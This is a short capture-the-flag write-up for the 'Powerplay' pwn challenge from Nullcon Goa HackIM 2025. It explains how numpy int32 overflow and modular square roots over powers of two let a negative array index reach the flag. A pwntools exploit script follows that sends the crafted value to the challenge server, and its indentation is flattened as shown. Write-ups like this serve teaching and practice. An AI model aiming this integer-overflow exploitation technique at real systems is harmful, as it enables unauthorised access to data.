---
title: "Powerplay - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "pow"
type: "writeup"
tags: ["pwn", "proof-of-work", "powerplay", "pow", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "We need to acess the negative indices, as they contain the flag."
source:
  name: "CTFtime writeup #39898"
  url: "https://ctftime.org/writeup/39898"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Powerplay"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Powerplay
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/39898>

---
We need to acess the negative indices, as they contain the flag.

Since numpy works mod 2^32, we can try and access 2^32-7.

Thus, we need x such that x^2==2^32-7

We can finish this using lifting on sucessive powers of 2, as demostrated by gen().

If we have a solution x with modulo mod, we can try x or x+(mod//2), and one of them will work, because (x+mod//2)^2=x^2+mod modulo (2*mod)

Thus, we get our square root and using it gives the flag.

```  
from pwn import *  
import numpy as np

def gen(x):  
if x%2==0:  
assert(x%4==0)  
return 2*gen(x//4)  
assert(x%8==1)  
sqr=1  
mod=8  
while mod<pow(2,32):  
#print(sqr,x,mod)  
assert(pow(sqr,2,mod)==x%mod)  
A=sqr  
B=sqr+mod//2  
mod*=2  
if (B*B)%mod==x%mod:  
sqr=B  
else:  
sqr=A  
assert(pow(sqr,2,pow(2,32))==x)  
return sqr

def test(y):  
io=remote('52.59.124.14',5016)  
# io=process(['python3','[chall.py](http://chall.py)'])  
io.sendlineafter(b"participate?",b"1")  
g=gen(y)  
power = np.zeros(1, dtype = np.int32)  
power[0]=g  
print(power**2,y)  
io.sendlineafter(b"right now?",str(g).encode())  
io.sendlineafter(b"to do?",b"1")  
io.sendlineafter(b"to do?",b"2")  
out=io.recvall()  
if b"You got an inspiration" in out:  
return True  
return False

# lo=1  
# hi=10000  
# while hi-lo>1:  
# mid=(hi+lo)//2  
# print(lo,hi)  
# if test(8*mid+1):  
# lo=mid  
# else:  
# hi=mid

test(pow(2,32)-7)

```
